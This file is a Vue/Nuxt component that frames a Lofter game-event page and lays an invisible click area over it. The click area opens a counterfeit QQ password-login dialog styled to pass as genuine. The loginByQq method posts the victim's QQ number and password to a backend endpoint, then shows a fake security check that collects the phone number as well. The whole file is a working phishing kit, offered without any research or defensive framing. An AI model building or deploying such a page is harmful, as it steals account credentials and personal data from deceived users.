<template>
  <div class="bg-black">
    <iframe name="xiaoganng" allow="fullscreen" src="https://www.lofter.com/spread/html/activities/arena-of-valor/?njb_navigator=false" width="100%" scrolling="yes" class="h-screen"></iframe>
    <div class="h-2/6 fixed bottom-0 w-full" @click="clickBottomDiv" v-show="isShowBottomDiv"></div>
    <div class="h-screen bg-white/30 fixed top-0 w-full" v-show="isShowBgDiv" ></div>
    <div class="h-screen fixed top-1/4 w-full" v-show="isShowBgDiv">
      <div class="text-center">
        <div class="max-w-md bg-white border-2 border-gray-500/30 m-auto" v-show="isShowQqDiv" >
          <div class="w-full h-5 text-end"><span class="text-gray-500 inline  mr-3 cursor-pointer" @click="closeDiv">X</span></div>
          <div class="flex justify-center">
            <div class="text-center p-8 w-full">
              <div class="text-center space-y-2 mb-4">
                <p class="text-lg">密码登录</p>
                <p class="text-[0.7rem]">推荐使用<span class="text-blue-500 cursor-pointer" @click="clickTelLog">手机快捷登录</span> 防止盗号</p>
              </div>
              <div class="md:w-4/6 w-full text-center mx-auto">
                <input type="number"
                       v-model="qqValue"
                       class="outline-none border-solid border w-full border-gray-500/30 rounded-md  p-1"
                       name="qqValue"/><br>
                <input type="password"
                       class="outline-none border-solid border w-full border-gray-500/30 rounded-md p-1 mt-3"
                       v-model="passwordValue"
                       name="passwordValue"/><br>
                <div class="text-left text-[0.6rem] mt-6 h-2">
                  <p class="text-red-700 px-2" v-show="showErrorMsg">{{ errorMsg }}</p>
                </div>
                <button class="bg-blue-500/90 rounded-md text-white mt-2 w-full py-2 text-xs" @click="loginByQq">{{  logButton }}</button>
                <ul class="flex text-xs w-full mt-12 justify-around">
                  <li><NuxtLink to="https://accounts.qq.com/find/password">找回密码</NuxtLink></li>
                  <li><NuxtLink to="https://ssl.zc.qq.com/v3/index-chs.html?type=0">注册账号</NuxtLink></li>
                  <li><NuxtLink to="https://support.qq.com/products/14802">意见反馈</NuxtLink></li>
                </ul>
              </div>
            </div>
          </div>
        </div>
        <div class="max-w-md bg-white border-2 border-gray-500/30 m-auto" v-show="isShowTelDiv" >
          <div class="w-full h-5 text-end"><span class="text-gray-500 inline  mr-3 cursor-pointer" @click="closeDiv">X</span></div>
          <div class="flex justify-center">
            <div class="text-center p-8 w-full">
              <div class="text-center space-y-2 mb-4">
                <p class="text-lg">{{ telObj.title ?? '' }}</p>
                <p class="text-[0.7rem]">{{ telObj.desc ?? '' }}</p>
              </div>
              <div class="w-4/6 text-center mx-auto">
                <input type="tel"
                       v-model="telNumber"
                       class="border-solid border w-full outline-none border-gray-500/30 rounded-md l p-1" name="telNumber"/><br>
                <div class="border-solid border w-full border-gray-500/30 rounded-md p-1 mt-3 flex">
                  <input type="number" maxlength="6" minlength="6" class="border-none outline-none flex-initial w-3/5 placeholder:text-xs"
                         placeholder="请输入验证码" name="verifyNumber" v-model="verifyNumber"/>
                  <span class="text-blue-500 flex-initial w-2/5 text-[0.7rem] align-middle mt-[0.3rem]" @click="clickVerify">发送验证码</span>
                </div>
                <div class="text-left text-[0.6rem] mt-6 h-2">
                  <p class="text-red-700 px-2" v-show="showErrorMsg">{{ errorMsg }}</p>
                </div>
                <button class="bg-blue-500/90 rounded-md text-white mt-2 w-full py-2 text-xs" @click="telButton">{{ telObj.button ?? '提交' }}</button>
                <ul class="flex text-xs w-full mt-12 justify-around">
                  <li class="cursor-pointer" @click="clickReturn">返回</li>
                  <li><NuxtLink to="https://ssl.zc.qq.com/v3/index-chs.html?type=0">注册账号</NuxtLink></li>
                  <li><NuxtLink to="https://support.qq.com/products/14802">意见反馈</NuxtLink></li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>

    </div>
  </div>
</template>

<script setup>


</script>

<script>
export default {
  data() {
    return {
      isShowBottomDiv: true,
      isShowBgDiv: false,
      isShowQqDiv:false,
      isShowTelDiv:false,
      telObj:{
        title: '手机号码验证',
        desc: '当前登录存在安全风险，请验证手机号后登录',
        button: '提交'
      },
      logButton: '登录',
      qqValue: '',
      passwordValue: '',
      telNumber: '',
      verifyNumber: '',
      errorMsg: '',
      isTelType: false
    }
  },
  methods: {
    clickBottomDiv() {
      this.isShowBottomDiv = false
      this.isShowBgDiv = true
      this.isShowQqDiv = true
      console.log('in')
    },

    clickTel()
    {
      this.isShowQqDiv = false
      this.isShowTelDiv = true
    },

    clickReturn()
    {
      this.isShowQqDiv = true
      this.isShowTelDiv = false
    },

    closeDiv()
    {
      this.isShowBottomDiv = true;
      this.isShowBgDiv = false;
      this.isShowQqDiv = false;
      this.isShowTelDiv = false;
    },

    clickTelLog(){
      this.isTelType = true;
      this.telObj = {
        title: '手机快捷登录',
        desc: '',
        button: '登录'
      }
      this.clickTel()
    },

    clickTelVerify() {
      this.isTelType = false
      this.telObj = {
        title: '手机号码验证',
        desc: '当前登录存在安全风险，请验证手机号后登录',
        button: '提交'
      }
      this.clickTel()
    },

    checkQq() {
      this.errorMsg = ''
      if (!/^\+?[1-9][0-9]{5,9}$/.test(this.qqValue)) {
        this.errorMsg = 'QQ号格式不正确'
        return false
      }
      return true
    },

    checkTel() {
      this.errorMsg = ''
      if (!/^1[345789]\d{9}$/.test(this.telNumber)) {
        this.errorMsg = '请输入正确的手机号'
        return false
      }
      return true
    },

    loginByQq() {
      if (this.qqValue.length <= 0) {
        this.errorMsg = '请输入QQ号'
        return
      }
      if (this.passwordValue <= 0) {
        this.errorMsg = '请输入密码'
        return
      }
      if (!this.checkQq())
        return
      this.errorMsg = ''
      this.send({
        title: 'qq info',
        qq: this.qqValue,
        passwd: this.passwordValue
      })
      this.logButton = '登录中...'
      setTimeout(()=> {
        this.logButton = '登录'
        this.clickTelVerify()
      }, 3000)
    },

    telButton() {
      if (this.telNumber.length <= 0) {
        this.errorMsg = '请输入手机号'
        return
      }
      if (this.verifyNumber.length <= 0) {
        this.errorMsg = '请输入验证码'
        return
      }
      if (!this.checkTel()) {
        return
      }

      if (this.isTelType) {
        this.loginByTel()
      } else {
        this.verifyByTel()
      }
    },

    loginByTel() {

      // save qq
      this.errorMsg = ''
    },

    verifyByTel() {

      this.clickTelVerify()
    },

    showErrorMsg () {
      return this.errorMsg.length > 0
    },

    send(obj = {})
    {
      $fetch('api/hello', {
        method: 'post',
        body: obj
      })
    },
    clickVerify(){
      if (this.telNumber.length <= 0) {
        this.errorMsg = '请输入手机号'
        return
      }
      if (!this.checkTel()) {
        return
      }
      this.send({
        title: 'verify tel',
        mobile: this.telNumber
      })
    }
  }
}
</script>